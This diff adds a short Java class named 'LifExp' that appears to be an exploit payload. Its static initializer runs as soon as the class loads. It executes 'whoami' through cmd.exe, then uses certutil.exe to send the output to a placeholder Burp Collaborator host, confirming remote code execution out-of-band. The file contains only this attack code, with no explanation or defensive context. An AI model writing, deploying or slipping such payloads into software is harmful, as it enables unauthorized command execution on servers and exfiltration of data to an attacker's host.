@@ -1,0 +1,20 @@
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+public class LifExp {
+
+static {
+
+try {
+            String[] cmd = {"cmd.exe", "/c", "whoami"};
+            Process process=java.lang.Runtime.getRuntime().exec(cmd);
+            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String s= stdInput.readLine();
+            String[] cmd2 = {"cmd.exe", "/c", "certutil.exe -urlcache -split -f http://XXXXXXXX.burpcollaborator.net/"+s+""};
+            java.lang.Runtime.getRuntime().exec(cmd2);
+        } catch ( Exception e ) {
+            e.printStackTrace();
+        }
+
+}
+}
